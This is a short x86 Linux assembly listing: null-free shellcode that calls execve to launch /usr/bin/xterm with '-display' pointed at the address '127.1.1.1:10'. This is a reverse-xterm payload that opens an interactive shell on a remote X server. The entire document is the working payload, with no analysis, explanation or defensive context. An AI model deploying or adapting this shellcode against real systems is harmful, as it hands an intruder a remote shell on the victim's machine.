section .text
    global _start
_start:
xor eax,eax
xor edx,edx
xor esi,esi
xor ecx,ecx
push eax
push 0x30313a31 ; setting 
push 0x2e312e31
push 0x2e373231
mov esi,esp
push eax
push 0x79616c70 ; -display
push 0x7369642d
mov edi,esp
push eax
push 0x6d726574   ; ///usr/bin/xterm
push 0x782f6e69
push 0x622f7273
push 0x752f2f2f
mov ebx,esp
push eax
push esi
push edi
push ebx
mov ecx,esp
mov al,11
int 0x80
